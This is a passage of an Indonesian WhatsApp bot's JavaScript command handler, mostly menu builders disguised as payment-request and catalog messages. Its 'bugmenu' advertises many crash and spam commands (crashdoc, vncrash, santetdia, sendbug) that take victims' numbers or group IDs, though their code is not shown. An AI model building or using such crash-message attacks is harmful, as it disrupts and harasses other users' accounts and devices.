    } catch {
console.log(i)
    }
}
m.reply(nomerny)
console.log("Done dump")
break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw sticBanLu(from)

const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)

reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break
//=================================================//
case 'kalkulator': case 'kal': {
if (isBan) throw sticBanLu(from)

if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'bokep':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
case 'tikvderffcxxdtok': case 'wmnjjbbhctd':
if (isBan) throw sticBanLu(from)
if (!q) return anjay(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return anjay(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
anjay(mess.wait)
haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Video Nya Kak` }, { quoted:hw })
break
//=================================================//
case 'cowner': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (isBan) throw sticBanLu(from)

if (!args[0]) return m.reply(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User sudah menjadi owner')
owner.push(orgnye)
m.reply(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes del friends`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//
case 'owner': case 'crator': {
if (isBan) throw sticBanLu(from)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//

//=================================================//

//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"requestPaymentimage": messa.imageMessage,
"requestFrom": "@s.whatsapp.net",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *LIST MENU* ❑
├❒ bot
├❒ scraperimage
├❒ asupanmata
├❒ scrapconvert
├❒ funnmenu
├❒ primbonmenu
├❒ islamiyah
├❒ voicechanger
├❒ beritanews
├❒ cmdmenu
├❒ searchmenu
├❒ groupmenu
├❒ downloadmenu
├❒ ownermenu
└❒ bugmenu

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'bot': {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hallo Masterr ${pushname} 👋 Berikan saya Perintah ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - © 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 -

┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
"url": "wa.me/6285814480623"
},  
"businessOwnerJid": "6285814480623@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: hw })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'spoimbxxcbot': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}


┌❑ *SOUND* *BOT* ❒
├❒ kal
├❒ ngakak
├❒ ketawa
├❒ awkwk
├❒ bang
├❒ nob
├❒ musik
├❒ mastah
├❒ cantik
├❒ kesel
└❒ ngeselin

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'funnmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *FUN* *MENU* ❒
├❒ bagaimanakah
├❒ kapankah
├❒ apakah
├❒ bisakah
├❒ rate
├❒ wangy
├❒ gantengcek
├❒ cekganteng
├❒ cantikcek
├❒ cekcantik
├❒ sangecek
├❒ ceksange
├❒ gaycek
├❒ cekgay
├❒ lesbicek
├❒ halah
├❒ hilih
├❒ huluh
├❒ heleh
├❒ holoh
├❒ delttt
└❒ suitpvp [@tag]

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
case 'bugmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}    


┌❑ BUG MENU 1 ❒
├❒ bugstiker
├❒ bugtagall
├❒ bugcatalog 
├❒ bugaudio
├❒ bugvn
├❒ bugvn1
├❒ bugvn2
├❒ bugvn3
├❒ bugvn4
├❒ bugvn5
├❒ bugtag
├❒ gastod
├❒ bugdoc1
├❒ bugdoc2
├❒ bugdoc3
├❒ bugdoc4
├❒ bugdoc5
├❒ bugdoc6
├❒ bugtroli
├❒ bugtroli2
├❒ buglist
├❒ buglokasi
├❒ bugliveloc
├❒ bugkontak
├❒ bugvideo
├❒ buginvite
├❒ colidek
└❒ bugbctext 

┌❑ BUG MENU 2 ❒
├❒ polling > bug polling / vote
├❒ troli3 > jumlah
├❒ bugdocu > jumlah
├❒ bugkontakv2 > jumlah
├❒ bugdocument > jumlah
├❒ cxzatroli > jumlah
├❒ bugbuttonv1 > jumlah
├❒ bugbuttonv2 > jumlah
├❒ buglivelocv2 > jumlah
├❒ buglivelocv3 > jumlah
├❒ buginvitev2 > jumlah
├❒ bugcatalogv2 > jumlah
├❒ bugcatalogv3 > jumlah
├❒ buglokasiv2 > jumlah 
├❒ sendkontak > 628xxx
├❒ crashdoc > 628xxx
├❒ sendlokasi > 628xxx
├❒ sendtroli > 628xxx 
├❒ gasbro > 628xxx 
├❒ gasdeck > 628xxx 
├❒ sendreaksi > 628xxx
├❒ sendbutton > 628xxx
├❒ stikercrash > 628xxx
├❒ vncrash > 628xxx
├❒ audiocrash > 628xxx
└❒ sendliveloc > 628xxx
 
┌❑ BUG MENU 3 ❒
├❒ sendbug1 > 628xxx 
├❒ sendbug2 > 628xxx 
├❒ sendbug3 > 628xxx 
├❒ sendbug4 > 628xxx 
├❒ sendbug5 > 628xxx 
├❒ sendbug6 > 628xxx 
├❒ sendbug7 > 628xxx 
├❒ sendbug8 > 628xxx 
├❒ sendbug9 > 628xxx 
└❒ sendbug10 > 628xxx 

┌❑ BUG MENU 4 ❒
├❒ gasbug1 > 628xxx 
├❒ gasbug2 > 628xxx 
├❒ gasbug3 > 628xxx 
├❒ gasbug4 > 628xxx 
├❒ gasbug5 > 628xxx 
├❒ gasbug6 > 628xxx 
├❒ gasbug7 > 628xxx 
├❒ gasbug8 > 628xxx 
├❒ gasbug9 > 628xxx 
├❒ gasbug10 > 628xxx 
├❒ gasbug11 > 628xxx 
└❒ gasbug12 > 628xxx 

┌❑ BUG MENU 5 ❒
├❒ spam > reply bug for spam
├❒ paybro > bug payment
├❒ bug1 > bug mentions
├❒ bug2 > bug mentions
├❒ bug3 > bug mentions
├❒ bug4 > bug mentions
├❒ bug5 > bug mentions
├❒ bug6 > bug mentions
├❒ jadibug1 > reply video
├❒ jadibug2 > reply video
├❒ jadibug3 > reply audio
├❒ jadibug4 > reply stiker
├❒ jadibug5 > reply gambar
├❒ santetdia > 628xxx@s.whatsapp.net|10|10s
├❒ santetgc > 1237891xxxx@g.us|10|10s
├❒ catalogpc > 628xxx@s.whatsapp.net|10|10s 
└❒ cataloggc > 1237891xxxx@g.us|10|10s

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'primbonmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *PRIMBON* *MENU* ❒
├❒ nomorhoki
├❒ artimimpi
├❒ artinama
├❒ ramaljodoh
├❒ ramaljodohbali
├❒ suamiistri
├❒ ramalcinta
├❒ cocoknama
├❒ pasangan
├❒ jadiannikah
├❒ sifatusaha
├❒ rezeki
├❒ pekerjaan
├❒ nasib
├❒ penyakit
├❒ tarot
├❒ fengshui
├❒ haribaik
├❒ harisangar
├❒ harisial
├❒ nagahari
├❒ arahrezeki
├❒ peruntungan
├❒ weton
├❒ karakter
├❒ keberuntungan
├❒ memancing
├❒ masasubur
├❒ zodiak
└❒ shio

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'islamiyah': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *ISLAMIYAH* ❒
├❒ iqra
├❒ hadist
├❒ alquran
├❒ juzamma
└❒ tafsirsurah

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *BERITA* *NEWS* ❒
├❒ merdeka-news
├❒ kontan-news 
├❒ cnbc-news
├❒ tribun-news
├❒ indozone-news
├❒ kompas-news
├❒ detik-news
├❒ daily-news
├❒ inews-news
├❒ okezone-news
├❒ sindo-news
├❒ tempo-news
├❒ antara-news
├❒ cnn-news
└❒ fajar-news 

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

//=================================================//
case 'groupmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 
 
 
┌❑ *GROUP* *MENU* ❒
├❒ linkgroup
├❒ ephemeral [option]
├❒ setppgc [image]
├❒ setname [text]
├❒ setdesc [text]
├❒ group [option]
├❒ editinfo [option]
├❒ add @user
├❒ kick @user
├❒ ban [targer]
├❒ hidetag [text]
├❒ tagall [text]
├❒ promote @user
├❒ demote @user
├❒ inspect
├❒ mute on / off
├❒ getname
├❒ translate
├❒ kalkulator
├❒ getpic
├❒ penjara
└❒ intro

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'voicechanger': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *VOICE* *CHANGER* ❒
├❒ bass
├❒ blown
├❒ deep
├❒ earrape
├❒ fast
├❒ fat
├❒ nightcore
├❒ reverse
├❒ robot
├❒ slow
└❒ tupai

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
case 'asupanmata': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *ASUPAN* *MATA* ❒
├❒ asupan
├❒ asupanukhty
├❒ asupansantuy
├❒ cecan-malaysia
├❒ cecan-indo
├❒ hijaber
├❒ cecan-korea
├❒ cecan-vietnam
├❒ cecan-thai
├❒ cecan-jepan
├❒ cecan
└❒ bokep

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
case 'searchmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *SEARCH MENU* ❒
├❒ yts [query]
├❒ google [query]
├❒ gimage [query]
├❒ pinterest [query]
├❒ wallpaper [query]
├❒ wikimedia [query]
├❒ ytsearch [query]
├❒ ringtone [query]
└❒ searchgroups [query]

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

//=================================================//
case 'scrapconvert': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *SCRAP* *CONVERT* ❒
├❒ attp
├❒ ttp
├❒ toimage
├❒ sticker
├❒ emojimix
├❒ emojimix2
├❒ tovideo
├❒ togif
├❒ tourl
├❒ tovn
├❒ toonce
├❒ tomp3
├❒ toaudio
├❒ ebinary
├❒ dbinary
├❒ styletext
└❒ ss [url]

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//===============================================

case 'cmdmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *CMD* *MENU* ❒
├❒ setcmd
├❒ listcmd
├❒ delcmd
├❒ lockcmd
├❒ addmsg
├❒ listmsg
├❒ getmsg
└❒ delmsg

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================/
case 'downloadmenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *DOWNLOAD* *MENU* ❒
├❒ pinterestdl [url]
├❒ ytmp3 [url]
├❒ ytmp4 [url]
├❒ getmusic [query]
├❒ getvideo [query]
└❒ mediafire [url]

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

//=================================================//
case 'ownermenu': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *OWNER* *MENU* ❒
├❒ react [emoji]
├❒ chat [option]
├❒ join [link]
├❒ leave
├❒ block @user
├❒ unblock @user
├❒ setppbot [image]
├❒ setexif
├❒ setmenu [option]
├❒ ping
├❒ owner
├❒ creator
├❒ menu / help /?
├❒ delete
├❒ infochat
├❒ quoted
├❒ cowner
├❒ listpc
├❒ listgc
├❒ listonline
└❒ speedtest

© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲
`,
}
}}}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break
//=================================================//
//=================================================//
case 'scraperimage': {
if (isBan) throw sticBanLu(from)
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `
Hay Master Berikan Saya Perintah!!! ${pushname} 👋 Selamat ${salam}


┌❑ *INFORMATION* ❑
├❒ Owner : ${botname}
├❒ Lib : Baileys MD
├❒ Browser : Chrome
├❒ Language : Javascript
├❒ Date Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
└❒ Time Sever : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} 


┌❑ *SCRAPER* *IMAGE* ❒
├❒ anime
├❒ coffe
├❒ quotesanime
├❒ couple
├❒ umma
├❒ haikal
├❒ loli
├❒ bully
├❒ waifu
├❒ cuddle
├❒ neko
├❒ cry
├❒ kiss
├❒ hug
├❒ lick
├❒ awoo
├❒ yeet
├❒ bite
├❒ lick
├❒ pat
├❒ kill
├❒ nom
├❒ poke
├❒ wink
├❒ bonk
├❒ glomp
├❒ smug
├❒ blush
├❒ wave
├❒ smile
├❒ highfive
├❒ cringe
